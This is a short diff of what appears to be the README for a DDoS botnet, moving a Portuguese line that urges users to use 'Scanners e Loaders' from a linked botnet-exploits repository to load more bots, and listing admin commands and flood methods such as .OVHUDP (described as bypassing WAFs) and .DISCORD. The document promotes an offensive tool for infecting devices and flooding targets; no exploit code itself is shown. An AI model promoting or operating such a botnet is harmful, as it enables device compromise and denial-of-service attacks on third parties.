@@ -9,7 +9,11 @@
 
 </div>
 
----
+<br/>
+
+> Tente usar <a href="https://github.com/CirqueiraDev/botnet-exploits">Scanners e Loaders</a> para carregar mais bots.
+
+<br/>
 
 ## Admin Commands
 - !user       Add/List/Remove users
@@ -33,10 +37,6 @@
 - .OVHTCP   Floods the target port with UDP datagrams containing random payloads
 - .OVHUDP   Randomizes bytes (0x00 to 0xFF) and line terminators to bypass WAFs
 - .DISCORD  Sends a specialized UDP packet designed to Discord
-
-<br/>
-
-> Tente usar <a href="https://github.com/CirqueiraDev/botnet-exploits">Scanners e Loaders</a> para carregar mais bots.
 
 <br/>
 
